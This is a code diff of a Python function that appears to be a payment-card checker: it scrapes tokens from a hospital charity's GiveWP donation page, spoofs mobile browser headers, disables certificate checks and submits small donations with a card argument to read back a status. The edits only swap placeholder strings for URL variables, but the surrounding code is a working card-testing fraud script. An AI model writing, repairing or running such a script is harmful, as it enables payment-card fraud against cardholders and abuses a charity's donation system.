@@ -38,7 +38,7 @@ def pp(ccx, amount="5.00", retry_count=1):
         r.verify = False
         
         headers = {
-            'authority': '{BASE_URL}',
+            'authority': BASE_URL,
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
@@ -54,7 +54,7 @@ def pp(ccx, amount="5.00", retry_count=1):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
         }
         
-        response = r.get('{SITE_URL}', headers=headers, timeout=20)
+        response = r.get(SITE_URL, headers=headers, timeout=20)
         
         if response.status_code != 200:
             return f"Site Error: {response.status_code}", "ERROR"
@@ -69,12 +69,12 @@ def pp(ccx, amount="5.00", retry_count=1):
         au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
         
         headers = {
-            'authority': '{BASE_URL}',
+            'authority': BASE_URL,
             'accept': '*/*',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
             'origin': 'https://{BASE_URL}',
-            'referer': '{SITE_URL}',
+            'referer': SITE_URL,
             'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -90,8 +90,8 @@ def pp(ccx, amount="5.00", retry_count=1):
             'give-form-id-prefix': pro0,
             'give-form-id': ifr,
             'give-form-title': 'Donate for a Unit/Room at TDC Sahiwal Hospital',
-            'give-current-url': '{SITE_URL}',
-            'give-form-url': '{SITE_URL}',
+            'give-current-url': SITE_URL,
+            'give-form-url': SITE_URL,
             'give-form-minimum': amount,
             'give-form-maximum': '999999.99',
             'give-form-hash': ssa,
@@ -134,8 +134,8 @@ def pp(ccx, amount="5.00", retry_count=1):
             'give-form-id-prefix': (None, pro0),
             'give-form-id': (None, ifr),
             'give-form-title': (None, 'Donate for a Unit/Room at TDC Sahiwal Hospital'),
-            'give-current-url': (None, '{SITE_URL}'),
-            'give-form-url': (None, '{SITE_URL}'),
+            'give-current-url': (None, SITE_URL),
+            'give-form-url': (None, SITE_URL),
             'give-form-minimum': (None, amount),
             'give-form-maximum': (None, '999999.99'),
             'give-form-hash': (None, ssa),
@@ -169,12 +169,12 @@ def pp(ccx, amount="5.00", retry_count=1):
         })
         
         headers = {
-            'authority': '{BASE_URL}',
+            'authority': BASE_URL,
             'accept': '*/*',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'content-type': multipart_data.content_type,
             'origin': 'https://{BASE_URL}',
-            'referer': '{SITE_URL}',
+            'referer': SITE_URL,
             'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -247,8 +247,8 @@ def pp(ccx, amount="5.00", retry_count=1):
             'give-form-id-prefix': (None, pro0),
             'give-form-id': (None, ifr),
             'give-form-title': (None, 'Donate for a Unit/Room at TDC Sahiwal Hospital'),
-            'give-current-url': (None, '{SITE_URL}'),
-            'give-form-url': (None, '{SITE_URL}'),
+            'give-current-url': (None, SITE_URL),
+            'give-form-url': (None, SITE_URL),
             'give-form-minimum': (None, amount),
             'give-form-maximum': (None, '999999.99'),
             'give-form-hash': (None, ssa),
@@ -282,12 +282,12 @@ def pp(ccx, amount="5.00", retry_count=1):
         })
         
         headers = {
-            'authority': '{BASE_URL}',
+            'authority': BASE_URL,
             'accept': '*/*',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'content-type': multipart_data2.content_type,
             'origin': 'https://{BASE_URL}',
-            'referer': '{SITE_URL}',
+            'referer': SITE_URL,
             'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
